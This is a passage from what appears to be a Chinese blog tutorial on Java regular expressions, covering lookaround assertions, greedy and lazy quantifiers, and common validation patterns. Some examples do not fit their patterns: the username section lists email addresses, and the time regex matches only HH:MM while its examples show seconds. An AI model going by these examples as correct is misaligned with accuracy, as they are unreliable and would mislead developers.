<p>(?<duplicateword>\w+): 匹配一个或多个单词字符。 命名此捕获组 duplicateWord。<br>\s: 与空白字符匹配。<br>\k<duplicateword>: 匹配名为 duplicateWord 的捕获的组。<br>\W: 匹配包括空格和标点符号的一个非单词字符。 这样可以防止正则表达式模式匹配从第一个捕获组的单词开头的单词。<br>(?<nextword>\w+): 匹配一个或多个单词字符。 命名此捕获组 nextWord。</nextword></duplicateword></duplicateword></p>
<h2 id="非捕获组"><a href="#非捕获组" class="headerlink" title="非捕获组"></a>非捕获组</h2><p><code>(?:exp)</code> 表示当一个限定符应用到一个组，但组捕获的子字符串并非所需时，通常会使用非捕获组构造。</p>
<p><strong>例 匹配以.结束的语句。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 匹配由句号终止的语句。</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"(?:\\b(?:\\w+)\\W*)+\\."</span>, <span class="string">"This is a short sentence. Never end"</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regex = (?:\b(?:\w+)\W*)+\., content: This is a short sentence. Never end</span><br><span class="line">[1th] start: 0, end: 25, group: This is a short sentence.</span><br></pre></td></tr></table></figure>

<h2 id="零宽断言"><a href="#零宽断言" class="headerlink" title="零宽断言"></a>零宽断言</h2><p>用于查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像\b,^,$那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为零宽断言。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>(?=exp)</code></td>
<td>匹配 exp 前面的位置</td>
</tr>
<tr>
<td><code>(?&lt;=exp)</code></td>
<td>匹配 exp 后面的位置</td>
</tr>
<tr>
<td><code>(?!exp)</code></td>
<td>匹配后面跟的不是 exp 的位置</td>
</tr>
<tr>
<td><code>(?&lt;!exp)</code></td>
<td>匹配前面不是 exp 的位置</td>
</tr>
</tbody></table>
<h3 id="匹配-exp-前面的位置"><a href="#匹配-exp-前面的位置" class="headerlink" title="匹配 exp 前面的位置"></a>匹配 exp 前面的位置</h3><p><code>(?=exp)</code> 表示输入字符串必须匹配<em>子表达式</em>中的正则表达式模式，尽管匹配的子字符串未包含在匹配结果中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// \b\w+(?=\sis\b) 表示要捕获is之前的单词</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"\\b\\w+(?=\\sis\\b)"</span>, <span class="string">"The dog is a Malamute."</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertFalse(findAll(<span class="string">"\\b\\w+(?=\\sis\\b)"</span>, <span class="string">"The island has beautiful birds."</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertFalse(findAll(<span class="string">"\\b\\w+(?=\\sis\\b)"</span>, <span class="string">"The pitch missed home plate."</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"\\b\\w+(?=\\sis\\b)"</span>, <span class="string">"Sunday is a weekend day."</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">regex = \b\w+(?=\sis\b), content: The dog is a Malamute.</span><br><span class="line">[1th] start: 4, end: 7, group: dog</span><br><span class="line">regex = \b\w+(?=\sis\b), content: The island has beautiful birds.</span><br><span class="line">not found</span><br><span class="line">regex = \b\w+(?=\sis\b), content: The pitch missed home plate.</span><br><span class="line">not found</span><br><span class="line">regex = \b\w+(?=\sis\b), content: Sunday is a weekend day.</span><br><span class="line">[1th] start: 0, end: 6, group: Sunday</span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
<p>\b: 在单词边界处开始匹配。</p>
<p>\w+: 匹配一个或多个单词字符。</p>
<p>(?=\sis\b): 确定单词字符是否后接空白字符和字符串“is”，其在单词边界处结束。 如果如此，则匹配成功。</p>
<h3 id="匹配-exp-后面的位置"><a href="#匹配-exp-后面的位置" class="headerlink" title="匹配 exp 后面的位置"></a>匹配 exp 后面的位置</h3><p><code>(?&lt;=exp)</code> 表示子表达式不得在输入字符串当前位置左侧出现，尽管子表达式未包含在匹配结果中。零宽度正回顾后发断言不会回溯。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (?&lt;=\b20)\d&#123;2&#125;\b 表示要捕获以20开头的数字的后面部分</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"(?&lt;=\\b20)\\d&#123;2&#125;\\b"</span>, <span class="string">"2010 1999 1861 2140 2009"</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regex = (?&lt;=\b20)\d&#123;2&#125;\b, content: 2010 1999 1861 2140 2009</span><br><span class="line">[1th] start: 2, end: 4, group: 10</span><br><span class="line">[2th] start: 22, end: 24, group: 09</span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
<p>\d{2}: 匹配两个十进制数字。</p>
<p>{?&lt;=\b20): 如果两个十进制数字的字边界以小数位数“20”开头，则继续匹配。</p>
<p>\b: 在单词边界处结束匹配。</p>
<h3 id="匹配后面跟的不是-exp-的位置"><a href="#匹配后面跟的不是-exp-的位置" class="headerlink" title="匹配后面跟的不是 exp 的位置"></a>匹配后面跟的不是 exp 的位置</h3><p><code>(?!exp)</code> 表示输入字符串不得匹配<em>子表达式</em>中的正则表达式模式，尽管匹配的子字符串未包含在匹配结果中。</p>
<p><strong>例 捕获未以“un”开头的单词</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// \b(?!un)\w+\b 表示要捕获未以“un”开头的单词</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"\\b(?!un)\\w+\\b"</span>, <span class="string">"unite one unethical ethics use untie ultimate"</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">regex = \b(?!un)\w+\b, content: unite one unethical ethics use untie ultimate</span><br><span class="line">[1th] start: 6, end: 9, group: one</span><br><span class="line">[2th] start: 20, end: 26, group: ethics</span><br><span class="line">[3th] start: 27, end: 30, group: use</span><br><span class="line">[4th] start: 37, end: 45, group: ultimate</span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
<p>\b: 在单词边界处开始匹配。</p>
<p>(?!un): 确定接下来的两个的字符是否为“un”。 如果没有，则可能匹配。</p>
<p>\w+: 匹配一个或多个单词字符。</p>
<p>\b: 在单词边界处结束匹配。</p>
<h3 id="匹配前面不是-exp-的位置"><a href="#匹配前面不是-exp-的位置" class="headerlink" title="匹配前面不是 exp 的位置"></a>匹配前面不是 exp 的位置</h3><p><code>(?&lt;!exp)</code> 表示子表达式不得在输入字符串当前位置的左侧出现。 但是，任何不匹配子表达式 的子字符串不包含在匹配结果中。</p>
<p><strong>例 捕获任意工作日</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (?&lt;!(Saturday|Sunday) )\b\w+ \d&#123;1,2&#125;, \d&#123;4&#125;\b 表示要捕获任意工作日（即周一到周五）</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"(?&lt;!(Saturday|Sunday) )\\b\\w+ \\d&#123;1,2&#125;, \\d&#123;4&#125;\\b"</span>, <span class="string">"Monday February 1, 2010"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"(?&lt;!(Saturday|Sunday) )\\b\\w+ \\d&#123;1,2&#125;, \\d&#123;4&#125;\\b"</span>, <span class="string">"Wednesday February 3, 2010"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertFalse(findAll(<span class="string">"(?&lt;!(Saturday|Sunday) )\\b\\w+ \\d&#123;1,2&#125;, \\d&#123;4&#125;\\b"</span>, <span class="string">"Saturday February 6, 2010"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertFalse(findAll(<span class="string">"(?&lt;!(Saturday|Sunday) )\\b\\w+ \\d&#123;1,2&#125;, \\d&#123;4&#125;\\b"</span>, <span class="string">"Sunday February 7, 2010"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"(?&lt;!(Saturday|Sunday) )\\b\\w+ \\d&#123;1,2&#125;, \\d&#123;4&#125;\\b"</span>, <span class="string">"Monday, February 8, 2010"</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">regex = (?&lt;!(Saturday|Sunday) )\b\w+ \d&#123;1,2&#125;, \d&#123;4&#125;\b, content: Monday February 1, 2010</span><br><span class="line">[1th] start: 7, end: 23, group: February 1, 2010</span><br><span class="line">regex = (?&lt;!(Saturday|Sunday) )\b\w+ \d&#123;1,2&#125;, \d&#123;4&#125;\b, content: Wednesday February 3, 2010</span><br><span class="line">[1th] start: 10, end: 26, group: February 3, 2010</span><br><span class="line">regex = (?&lt;!(Saturday|Sunday) )\b\w+ \d&#123;1,2&#125;, \d&#123;4&#125;\b, content: Saturday February 6, 2010</span><br><span class="line">not found</span><br><span class="line">regex = (?&lt;!(Saturday|Sunday) )\b\w+ \d&#123;1,2&#125;, \d&#123;4&#125;\b, content: Sunday February 7, 2010</span><br><span class="line">not found</span><br><span class="line">regex = (?&lt;!(Saturday|Sunday) )\b\w+ \d&#123;1,2&#125;, \d&#123;4&#125;\b, content: Monday, February 8, 2010</span><br><span class="line">[1th] start: 8, end: 24, group: February 8, 2010</span><br></pre></td></tr></table></figure>

<h2 id="贪婪与懒惰"><a href="#贪婪与懒惰" class="headerlink" title="贪婪与懒惰"></a>贪婪与懒惰</h2><p>当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配<strong>尽可能多</strong>的字符。以这个表达式为例：a.*b，它将会匹配最长的以 a 开始，以 b 结束的字符串。如果用它来搜索 aabab 的话，它会匹配整个字符串 aabab。这被称为贪婪匹配。</p>
<p>有时，我们更需要懒惰匹配，也就是匹配<strong>尽可能少</strong>的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号?。这样.*?就意味着匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复。</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>*?</code></td>
<td>重复任意次，但尽可能少重复</td>
</tr>
<tr>
<td><code>+?</code></td>
<td>重复 1 次或更多次，但尽可能少重复</td>
</tr>
<tr>
<td><code>??</code></td>
<td>重复 0 次或 1 次，但尽可能少重复</td>
</tr>
<tr>
<td><code>{n,m}?</code></td>
<td>重复 n 到 m 次，但尽可能少重复</td>
</tr>
<tr>
<td><code>{n,}?</code></td>
<td>重复 n 次以上，但尽可能少重复</td>
</tr>
</tbody></table>
<p><strong>例 Java 正则中贪婪与懒惰的示例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 贪婪匹配</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"a\\w*b"</span>, <span class="string">"abaabaaabaaaab"</span>) &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 懒惰匹配</span></span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"a\\w*?b"</span>, <span class="string">"abaabaaabaaaab"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"a\\w+?b"</span>, <span class="string">"abaabaaabaaaab"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"a\\w??b"</span>, <span class="string">"abaabaaabaaaab"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"a\\w&#123;0,4&#125;?b"</span>, <span class="string">"abaabaaabaaaab"</span>) &gt; <span class="number">0</span>);</span><br><span class="line">Assert.assertTrue(findAll(<span class="string">"a\\w&#123;3,&#125;?b"</span>, <span class="string">"abaabaaabaaaab"</span>) &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>输出</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">regex = a\w*b, content: abaabaaabaaaab</span><br><span class="line">[1th] start: 0, end: 14, group: abaabaaabaaaab</span><br><span class="line">regex = a\w*?b, content: abaabaaabaaaab</span><br><span class="line">[1th] start: 0, end: 2, group: ab</span><br><span class="line">[2th] start: 2, end: 5, group: aab</span><br><span class="line">[3th] start: 5, end: 9, group: aaab</span><br><span class="line">[4th] start: 9, end: 14, group: aaaab</span><br><span class="line">regex = a\w+?b, content: abaabaaabaaaab</span><br><span class="line">[1th] start: 0, end: 5, group: abaab</span><br><span class="line">[2th] start: 5, end: 9, group: aaab</span><br><span class="line">[3th] start: 9, end: 14, group: aaaab</span><br><span class="line">regex = a\w??b, content: abaabaaabaaaab</span><br><span class="line">[1th] start: 0, end: 2, group: ab</span><br><span class="line">[2th] start: 2, end: 5, group: aab</span><br><span class="line">[3th] start: 6, end: 9, group: aab</span><br><span class="line">[4th] start: 11, end: 14, group: aab</span><br><span class="line">regex = a\w&#123;0,4&#125;?b, content: abaabaaabaaaab</span><br><span class="line">[1th] start: 0, end: 2, group: ab</span><br><span class="line">[2th] start: 2, end: 5, group: aab</span><br><span class="line">[3th] start: 5, end: 9, group: aaab</span><br><span class="line">[4th] start: 9, end: 14, group: aaaab</span><br><span class="line">regex = a\w&#123;3,&#125;?b, content: abaabaaabaaaab</span><br><span class="line">[1th] start: 0, end: 5, group: abaab</span><br><span class="line">[2th] start: 5, end: 14, group: aaabaaaab</span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
<p>本例中代码展示的是使用不同贪婪或懒惰策略去查找字符串”abaabaaabaaaab” 中匹配<strong>以”a”开头，以”b”结尾的所有子字符串</strong>。</p>
<p>请从输出结果中，细细体味使用不同的贪婪或懒惰策略，对于匹配子字符串有什么影响。</p>
<h2 id="最实用的正则"><a href="#最实用的正则" class="headerlink" title="最实用的正则"></a>最实用的正则</h2><h3 id="校验中文"><a href="#校验中文" class="headerlink" title="校验中文"></a>校验中文</h3><p><strong>描述：</strong>校验字符串中只能有中文字符（不包括中文标点符号）。中文字符的 Unicode 编码范围是\u4e00 到 \u9fa5。</p>
<p>如有兴趣，可以参考<a href="http://baike.baidu.com/link?url=3xi0vmvCIGKQLJZdn_BYhQ1IDFsoSJMrya6_eOjCBb7A6cRIW-zhZFLC9Yh8wjxU6A_HCfNuP8FBBXU9CN3Wcq" target="_blank" rel="noopener"><strong><em>百度百科-Unicode</em></strong></a> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[\u4e00-\u9fa5]+$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong> 春眠不觉晓</p>
<p><strong>不匹配：</strong>春眠不觉晓，</p>
<h3 id="校验身份证号码"><a href="#校验身份证号码" class="headerlink" title="校验身份证号码"></a>校验身份证号码</h3><p><strong>描述：</strong>身份证为 15 位或 18 位。15 位是第一代身份证。从 1999 年 10 月 1 日起，全国实行公民身份证号码制度，居民身份证编号由原 15 位升至 18 位。</p>
<p><strong>15 位身份证</strong></p>
<p><strong>描述：</strong>由 15 位数字组成。排列顺序从左至右依次为：六位数字地区码；六位数字出生日期；三位顺序号，其中 15 位男为单数，女为双数。</p>
<p><strong>18 位身份证</strong></p>
<p><strong>描述：</strong>由十七位数字本体码和一位数字校验码组成。排列顺序从左至右依次为：六位数字地区码；八位数字出生日期；三位数字顺序码和一位数字校验码（也可能是 X）。</p>
<p>身份证号含义详情请见：<a href="http://baike.baidu.com/link?url=5mYlYNE0RsSe2D4tydajtiaR8hAm4pPZ0FHSPuQ05N4f6H-i7qPuw7sY5KfNuiOVJWVWZvU4gf3IY-vIcKdP1CU4Fv-9pKmFQB50qGv_hZT2dkGbkd9--8_saY7omV80vEw9ixVeEwda37fHswfmtyU4QSiBG5s3K5K-JnYr1dqNlPu0f3t008UcLh5-wyID" target="_blank" rel="noopener"><strong><em>百度百科-居民身份证号码</em></strong></a></p>
<p><strong>地区码（6 位）</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(1[1-5]|2[1-3]|3[1-7]|4[1-3]|5[0-4]|6[1-5])\d&#123;4&#125;</span><br></pre></td></tr></table></figure>

<p><strong>出生日期（8 位）</strong></p>
<p>注：下面的是 18 位身份证的有效出生日期，如果是 15 位身份证，只要将第一个\d{4}改为\d{2}即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((\d&#123;4&#125;((0[13578]|1[02])(0[1-9]|[12]\d|3[01])|(0[13456789]|1[012])(0[1-9]|[12]\d|30)|02(0[1-9]|1\d|2[0-8])))|([02468][048]|[13579][26])0229)</span><br></pre></td></tr></table></figure>

<p><strong>15 位有效身份证</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((1[1-5]|2[1-3]|3[1-7]|4[1-3]|5[0-4]|6[1-5])\d&#123;4&#125;)((\d&#123;2&#125;((0[13578]|1[02])(0[1-9]|[12]\d|3[01])|(0[13456789]|1[012])(0[1-9]|[12]\d|30)|02(0[1-9]|1\d|2[0-8])))|([02468][048]|[13579][26])0229)(\d&#123;3&#125;)$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>110001700101031</p>
<p><strong>不匹配：</strong>110001701501031</p>
<p><strong>18 位有效身份证</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((1[1-5]|2[1-3]|3[1-7]|4[1-3]|5[0-4]|6[1-5])\d&#123;4&#125;)((\d&#123;4&#125;((0[13578]|1[02])(0[1-9]|[12]\d|3[01])|(0[13456789]|1[012])(0[1-9]|[12]\d|30)|02(0[1-9]|1\d|2[0-8])))|([02468][048]|[13579][26])0229)(\d&#123;3&#125;(\d|X))$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>110001199001010310 | 11000019900101015X</p>
<p><strong>不匹配：</strong>990000199001010310 | 110001199013010310</p>
<h3 id="校验有效用户名、密码"><a href="#校验有效用户名、密码" class="headerlink" title="校验有效用户名、密码"></a>校验有效用户名、密码</h3><p><strong>描述：</strong>长度为 6-18 个字符，允许输入字母、数字、下划线，首字符必须为字母。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z]\w&#123;5,17&#125;$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong><a href="mailto:he_llo@worl.d.com" target="_blank" rel="noopener">he_llo@worl.d.com</a> | <a href="mailto:hel.l-o@wor-ld.museum" target="_blank" rel="noopener">hel.l-o@wor-ld.museum</a> | <a href="mailto:h1ello@123.com" target="_blank" rel="noopener">h1ello@123.com</a></p>
<p><strong>不匹配：</strong><a href="mailto:hello@worl_d.com" target="_blank" rel="noopener">hello@worl_d.com</a> | he&amp;llo@world.co1 | .hello@wor#.co.uk</p>
<h3 id="校验邮箱"><a href="#校验邮箱" class="headerlink" title="校验邮箱"></a>校验邮箱</h3><p><strong>描述：</strong>不允许使用 IP 作为域名，如 : <a href="mailto:hello@154.145.68.12" target="_blank" rel="noopener">hello@154.145.68.12</a></p>
<p><code>@</code>符号前的邮箱用户和<code>.</code>符号前的域名(domain)必须满足以下条件：</p>
<ul>
<li>字符只能是英文字母、数字、下划线<code>_</code>、<code>.</code>、<code>-</code> ；</li>
<li>首字符必须为字母或数字；</li>
<li><code>_</code>、<code>.</code>、<code>-</code> 不能连续出现。</li>
</ul>
<p>域名的根域只能为字母，且至少为两个字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]&#123;2,&#125;)$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong><a href="mailto:he_llo@worl.d.com" target="_blank" rel="noopener">he_llo@worl.d.com</a> | <a href="mailto:hel.l-o@wor-ld.museum" target="_blank" rel="noopener">hel.l-o@wor-ld.museum</a> | <a href="mailto:h1ello@123.com" target="_blank" rel="noopener">h1ello@123.com</a></p>
<p><strong>不匹配：</strong><a href="mailto:hello@worl_d.com" target="_blank" rel="noopener">hello@worl_d.com</a> | he&amp;llo@world.co1 | .hello@wor#.co.uk</p>
<h3 id="校验-URL"><a href="#校验-URL" class="headerlink" title="校验 URL"></a>校验 URL</h3><p><strong>描述：</strong>校验 URL。支持 http、https、ftp、ftps。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(ht|f)(tp|tps)\://[a-zA-Z0-9\-\.]+\.([a-zA-Z]&#123;2,3&#125;)?(/\S*)?$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong><a href="http://google.com/help/me" target="_blank" rel="noopener">http://google.com/help/me</a> | <a href="http://www.google.com/help/me/" target="_blank" rel="noopener">http://www.google.com/help/me/</a> | <a href="https://www.google.com/help.asp" target="_blank" rel="noopener">https://www.google.com/help.asp</a> | <a href="ftp://www.google.com" target="_blank" rel="noopener">ftp://www.google.com</a> | ftps://google.org</p>
<p><strong>不匹配：</strong><a href="http://un/www.google.com/index.asp" target="_blank" rel="noopener">http://un/www.google.com/index.asp</a></p>
<h3 id="校验时间"><a href="#校验时间" class="headerlink" title="校验时间"></a>校验时间</h3><p><strong>描述：</strong>校验时间。时、分、秒必须是有效数字，如果数值不是两位数，十位需要补零。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^([0-1][0-9]|[2][0-3]):([0-5][0-9])$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>00:00:00 | 23:59:59 | 17:06:30</p>
<p><strong>不匹配：</strong>17:6:30 | 24:16:30</p>
<h3 id="校验日期"><a href="#校验日期" class="headerlink" title="校验日期"></a>校验日期</h3><p><strong>描述：</strong>校验日期。日期满足以下条件：</p>
<ul>
<li>格式 yyyy-MM-dd 或 yyyy-M-d</li>
<li>连字符可以没有或是“-”、“/”、“.”之一</li>
<li>闰年的二月可以有 29 日；而平年不可以。</li>
<li>一、三、五、七、八、十、十二月为 31 日。四、六、九、十一月为 30 日。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(?:(?!0000)[0-9]&#123;4&#125;([-/.]?)(?:(?:0?[1-9]|1[0-2])\1(?:0?[1-9]|1[0-9]|2[0-8])|(?:0?[13-9]|1[0-2])\1(?:29|30)|(?:0?[13578]|1[02])\1(?:31))|(?:[0-9]&#123;2&#125;(?:0[48]|[2468][048]|[13579][26])|(?:0[48]|[2468][048]|[13579][26])00)([-/.]?)0?2\2(?:29))$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>2016/1/1 | 2016/01/01 | 20160101 | 2016-01-01 | 2016.01.01 | 2000-02-29</p>
<p><strong>不匹配：</strong>2001-02-29 | 2016/12/32 | 2016/6/31 | 2016/13/1 | 2016/0/1</p>
<h3 id="校验中国手机号码"><a href="#校验中国手机号码" class="headerlink" title="校验中国手机号码"></a>校验中国手机号码</h3><blockquote>
<hr>
<p><strong>2020.1.1 更新</strong>：<br>中国通信运营商有：移动、联通、电信<br>中国移动：134（不含1349）、135、136、137、138、139、147、148、150、151、152、157、158、 159、165、172、178、182、183、184、187、188、198、197<br>中国联通：130、131、132、140（物联网）、145（上网卡）、146、155、156、166、167、185、186、175、176、196<br>中国电信：133、1349（卫星通信）、149、153、180、181、189、177、173、174、191、199、162、190<br>4G号段：176/175（联通）、173/177（电信）、178（移动）<br>虚拟运营商：170 [ 1700/1701/1702（电信）、1703/1705/1706（移动）、1704/1707/1708/1709（联通）]、167、171（联通）<br>未知号段：141、142、143、144、154、192<br>我国使用的手机号码为11位数字，我们的手机号可以分为三段，都有不同的编码含义：前3位是网络识别号、4-7位是地区编码（HLR归属位置寄存器）、8-11位是用户号码（随机分配）。</p>
<hr>
</blockquote>
<blockquote>
<p><strong>已过时</strong></p>
</blockquote>
<p><strong>描述：</strong>中国手机号码正确格式：11 位数字。</p>
<p>移动有 16 个号段：134、135、136、137、138、139、147、150、151、152、157、158、159、182、187、188。其中 147、157、188 是 3G 号段，其他都是 2G 号段。联通有 7 种号段：130、131、132、155、156、185、186。其中 186 是 3G（WCDMA）号段，其余为 2G 号段。电信有 4 个号段：133、153、180、189。其中 189 是 3G 号段（CDMA2000），133 号段主要用作无线网卡号。总结：13 开头手机号 0-9；15 开头手机号 0-3、5-9；18 开头手机号 0、2、5-9。</p>
<p>此外，中国在国际上的区号为 86，所以手机号开头有+86、86 也是合法的。</p>
<p>以上信息来源于 <a href="http://baike.baidu.com/link?url=Bia2K_f8rGcakOlP4d9m_-DNSgXU5-0NDP0pPavS0ZbhRHQcUFUTbMERjdO4u7cvkpTJaIDeUXq_EXWnMqXMdSuMQDX3NAbZXAlZYl_V18KATWF7y1EFzUyJ62rf3bAN" target="_blank" rel="noopener"><strong><em>百度百科-手机号</em></strong></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^((\+)?86\s*)?((13[0-9])|(15([0-3]|[5-9]))|(18[0,2,5-9]))\d&#123;8&#125;$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>+86 18012345678 | 86 18012345678 | 15812345678</p>
<p><strong>不匹配：</strong>15412345678 | 12912345678 | 180123456789</p>
<h3 id="校验中国固话号码"><a href="#校验中国固话号码" class="headerlink" title="校验中国固话号码"></a>校验中国固话号码</h3><p><strong>描述：</strong>固话号码，必须加区号（以 0 开头）。<br>3 位有效区号：010、020~029，固话位数为 8 位。<br>4 位有效区号：03xx 开头到 09xx，固话位数为 7。</p>
<p>如果想了解更详细的信息，请参考 <a href="http://baike.baidu.com/link?url=sX8JoxK1ja5uM5pDYvQe27_QsyqAZ_78DLSeEvwjqtG_uXqU6p5Oh7CPbImNbnwu1ClOmD8udgDIswZfYzQIw0z3BYZO3eTplvVDzieuowTYqt7yHGDAqyT7o4vvGhg4" target="_blank" rel="noopener"><strong><em>百度百科-电话区号</em></strong></a> 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(010|02[0-9])(\s|-)\d&#123;8&#125;|(0[3-9]\d&#123;2&#125;)(\s|-)\d&#123;7&#125;$</span><br></pre></td></tr></table></figure>

<p><strong>匹配：</strong>010-12345678 | 010 12345678 | 0512-1234567 | 0512 1234567</p>
<p><strong>不匹配：</strong>1234567 | 12345678</p>
